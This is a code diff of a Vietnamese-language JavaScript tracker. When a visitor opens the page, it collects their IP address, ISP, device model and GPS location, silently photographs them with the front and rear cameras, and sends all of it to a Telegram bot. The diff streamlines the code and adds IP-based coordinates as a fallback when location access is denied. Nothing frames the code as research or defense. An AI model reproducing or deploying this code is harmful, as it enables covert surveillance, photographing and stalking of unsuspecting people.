@@ -5,81 +5,40 @@ const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMe
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
-    time: '',
-    ip: '',
-    isp: '',
-    realIp: '',
-    address: '',
-    country: '', 
-    lat: '',
-    lon: '',
-    device: '',
-    os: '',
+    time: '', ip: '', isp: '', address: '',
+    lat: '', lon: '', device: '', os: '',
     camera: '\u23F3 \u0110\u0061\u006E\u0067 \u006B\u0069\u1EC3\u006D \u0074\u0072\u0061\u002E\u002E\u002E'
 };
 
 function detectDevice() {
     const ua = navigator.userAgent;
-    const platform = navigator.platform;
-    const screenW = window.screen.width;
-    const screenH = window.screen.height;
-    const ratio = window.devicePixelRatio;
-
     if (/Android/i.test(ua)) {
         info.os = 'Android';
         const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
         info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
-    } 
-    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
         info.os = 'iOS';
-        const res = `${screenW}x${screenH}@${ratio}`;
-        const iphoneModels = {
-            "430x932@3": "iPhone 14/15/16 Pro Max",
-            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
-            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
-            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
-            "414x896@3": "iPhone XS Max / 11 Pro Max",
-            "414x896@2": "iPhone XR / 11",
-            "375x812@3": "iPhone X / XS / 11 Pro",
-            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
-        };
-        info.device = iphoneModels[res] || 'iPhone/iPad';
-    } 
-    else if (/Windows NT/i.test(ua)) {
-        info.device = 'Windows PC';
-        info.os = 'Windows';
+        info.device = 'iPhone/iPad';
     } else {
-        info.device = 'Không xác định';
-        info.os = 'Không rõ';
+        info.os = 'Windows/PC';
+        info.device = 'Computer';
     }
 }
 
 async function getIPs() {
     try {
-        const [res1, res2] = await Promise.all([
-            fetch('https://api.ipify.org?format=json').then(r => r.json()),
-            fetch('https://ipwho.is/').then(r => r.json())
-        ]);
-        info.ip = res1.ip;
-        info.realIp = res2.ip;
-        info.isp = res2.connection?.org || 'N/A';
-        info.country = res2.country || 'Việt Nam';
-    } catch (e) {
-        info.ip = 'Bị chặn';
-        info.realIp = 'Lỗi kết nối';
-    }
+        const res = await fetch('https://ipwho.is/').then(r => r.json());
+        info.ip = res.ip;
+        info.isp = res.connection?.org || 'N/A';
+        // Dự phòng tọa độ từ IP nếu GPS bị từ chối
+        info.lat = res.latitude;
+        info.lon = res.longitude;
+    } catch (e) { info.ip = 'Bị chặn'; }
 }
 
 async function getLocation() {
     return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(fallbackIPLocation());
-
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        };
-
+        if (!navigator.geolocation) return resolve();
         navigator.geolocation.getCurrentPosition(
             async pos => {
                 info.lat = pos.coords.latitude;
@@ -89,24 +48,13 @@ async function getLocation() {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                     const data = await res.json();
                     info.address = (data.display_name || 'Vị trí thực tế') + acc;
-                } catch { 
-                    info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
-                }
+                } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; }
                 resolve();
             },
-            async () => { await fallbackIPLocation(); resolve(); },
-            options
+            () => resolve(), // Nếu lỗi hoặc từ chối, dùng tọa độ IP đã lấy ở hàm getIPs
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Giới hạn đúng 5 giây
         );
     });
-}
-
-async function fallbackIPLocation() {
-    try {
-        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
-        info.lat = data.latitude || '0';
-        info.lon = data.longitude || '0';
-        info.address = `${data.city}, ${data.region} (\u01AF\u1EDB\u0063 \u0074\u0068\u00ED\u006E\u0068 \u0071\u0075\u0061 \u0049\u0050)`;
-    } catch (e) { info.address = 'Không xác định'; }
 }
 
 async function captureCamera(facingMode = 'user') {
@@ -140,57 +88,46 @@ function getCaption() {
     return `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n` +
            `\u231B Th\u1EDDi gian: ${info.time}\n` +
            `\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${info.device} (${info.os})\n` +
-           `\uD83C\uDF10 IP D\u00E2n c\u01B0: ${info.ip}\n` +
+           `\uD83C\uDF10 IP: ${info.ip}\n` +
            `\uD83C\uDFE2 ISP: ${info.isp}\n` +
-           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address}\n` +
+           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address || 'Đang xác định...'}\n` +
            `\uD83D\uDCCC Google Maps: ${mapsLink}\n` +
            `\uD83D\uDCF8 Camera: ${info.camera}`;
-}
-
-async function sendPhotos(frontBlob, backBlob) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    
-    const media = [];
-    if (frontBlob) {
-        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
-        formData.append('front', frontBlob, 'front.jpg');
-    }
-    if (backBlob) {
-        media.push({ type: 'photo', media: 'attach://back' });
-        formData.append('back', backBlob, 'back.jpg');
-    }
-
-    formData.append('media', JSON.stringify(media));
-    return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
-}
-
-async function sendTextOnly() {
-    return fetch(API_SEND_TEXT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
-    });
 }
 
 async function main() {
     info.time = new Date().toLocaleString('vi-VN');
     detectDevice();
     
-    await Promise.all([getIPs(), getLocation()]);
+    // Ưu tiên lấy IP trước để có tọa độ dự phòng
+    await getIPs();
+    // Chạy GPS song song trong tối đa 5s
+    await getLocation();
 
     let front = await captureCamera("user");
-    let back = null;
-    
-    if (front) {
-        back = await captureCamera("environment");
-    }
+    let back = front ? await captureCamera("environment") : null;
 
     if (front || back) {
         info.camera = `\u2705 \u0110\u00E3 ch\u1EE5p: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
-        await sendPhotos(front, back);
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        const media = [];
+        if (front) {
+            media.push({ type: 'photo', media: 'attach://f', caption: getCaption() });
+            formData.append('f', front, 'f.jpg');
+        }
+        if (back) {
+            media.push({ type: 'photo', media: 'attach://b' });
+            formData.append('b', back, 'b.jpg');
+        }
+        formData.append('media', JSON.stringify(media));
+        await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
     } else {
-        info.camera = '\uD83D\uDEAB B\u1ECB t\u1EEB ch\u1ED1i ho\u1EB7c l\u1ED7i';
-        await sendTextOnly();
+        info.camera = '\uD83D\uDEAB B\u1ECB t\u1EEB ch\u1ED1i';
+        await fetch(API_SEND_TEXT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
+        });
     }
 }
